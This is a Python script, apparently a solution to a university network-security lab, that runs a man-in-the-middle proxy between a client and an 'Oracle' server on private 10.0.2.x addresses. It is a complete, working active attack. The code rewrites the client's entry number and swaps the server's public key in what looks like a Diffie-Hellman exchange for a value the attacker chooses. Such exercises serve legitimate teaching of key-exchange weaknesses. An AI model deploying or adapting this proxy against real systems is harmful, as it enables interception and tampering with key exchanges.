import select
import socket
import sys

MITM_IP = "10.0.2.101"  
MITM_PORT = 5555  

ORACLE_IP = "10.0.2.100"  
ORACLE_PORT = 5555  


ENTRY_NUMBER_ORIGINAL = "2024JCS2043"
ENTRY_NUMBER_MODIFIED = "2024JCS2613"

PUBLIC_KEY_ORIGINAL = "135123667066"  
PUBLIC_KEY_MODIFIED = "123456789"  

BUFFER_SIZE = 4096


def main():
    
    try:
        mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mitm_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        mitm_socket.bind((MITM_IP, MITM_PORT))
        mitm_socket.listen(5)
        print(f"[+] MiM server listening on {MITM_IP}:{MITM_PORT}")
    except Exception as e:
        print(f"[-] Failed to create listening socket: {e}")
        sys.exit(1)

    while True:
        try:
            client_conn, client_addr = mitm_socket.accept()
            print(f"[+] Accepted connection from {client_addr}")

            try:
                oracle_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                oracle_conn.connect((ORACLE_IP, ORACLE_PORT))
                print(f"[+] Connected to Oracle server at {ORACLE_IP}:{ORACLE_PORT}")
            except Exception as e:
                print(f"[-] Failed to connect to Oracle server: {e}")
                client_conn.close()
                continue

            client_conn.setblocking(0)
            oracle_conn.setblocking(0)

            client_buffer = b""
            oracle_buffer = b""

            STATE_WAITING_FOR_ENTRY = 0
            STATE_WAITING_FOR_PG = 1
            STATE_WAITING_FOR_PUBLIC_KEY_A = 2
            STATE_WAITING_FOR_PUBLIC_KEY_B = 3
            current_state = STATE_WAITING_FOR_ENTRY

            while True:
                read_sockets, _, _ = select.select(
                    [client_conn, oracle_conn], [], [], 1
                )

                for sock in read_sockets:
                    if sock == client_conn:
                        data = client_conn.recv(BUFFER_SIZE)
                        if not data:
                            print(f"[-] Client {client_addr} disconnected.")
                            raise Exception("Client disconnected")
                        print(
                            f"[>] Received from client: {data.decode('utf-8', errors='ignore')}"
                        )

                        if current_state == STATE_WAITING_FOR_ENTRY:
                            if ENTRY_NUMBER_ORIGINAL.encode() in data:
                                modified_data = data.replace(
                                    ENTRY_NUMBER_ORIGINAL.encode(),
                                    ENTRY_NUMBER_MODIFIED.encode(),
                                )
                                print(
                                    f"[>] Modified entry number: {modified_data.decode('utf-8', errors='ignore')}"
                                )
                                oracle_conn.sendall(modified_data)
                                current_state = STATE_WAITING_FOR_PG
                            else:
                                oracle_conn.sendall(data)
                                current_state = STATE_WAITING_FOR_PG

                        elif current_state == STATE_WAITING_FOR_PUBLIC_KEY_A:
                            oracle_conn.sendall(data)
                            current_state = STATE_WAITING_FOR_PUBLIC_KEY_B

                        else:
                            oracle_conn.sendall(data)

                    elif sock == oracle_conn:
                        data = oracle_conn.recv(BUFFER_SIZE)
                        if not data:
                            print(f"[-] Oracle server {ORACLE_IP} disconnected.")
                            raise Exception("Oracle server disconnected")
                        print(
                            f"[<] Received from Oracle server: {data.decode('utf-8', errors='ignore')}"
                        )

                        if current_state == STATE_WAITING_FOR_PG:
                            client_conn.sendall(data)
                            current_state = STATE_WAITING_FOR_PUBLIC_KEY_A

                        elif current_state == STATE_WAITING_FOR_PUBLIC_KEY_B:
                            if PUBLIC_KEY_ORIGINAL in data.decode(
                                "utf-8", errors="ignore"
                            ):
                                modified_response = data.replace(
                                    PUBLIC_KEY_ORIGINAL.encode(),
                                    PUBLIC_KEY_MODIFIED.encode(),
                                )
                                print(
                                    f"[<] Modified Oracle's public key: {modified_response.decode('utf-8', errors='ignore')}"
                                )
                                client_conn.sendall(modified_response)
                            else:
                                client_conn.sendall(data)
                            current_state = (
                                STATE_WAITING_FOR_ENTRY 
                            )
                            print("[+] Communication cycle completed.")

                        else:
                            client_conn.sendall(data)

        except Exception as e:
            print(f"[-] Connection error: {e}")
            client_conn.close()
            oracle_conn.close()
            print("[*] Waiting for new connections...\n")


if __name__ == "__main__":
    main()
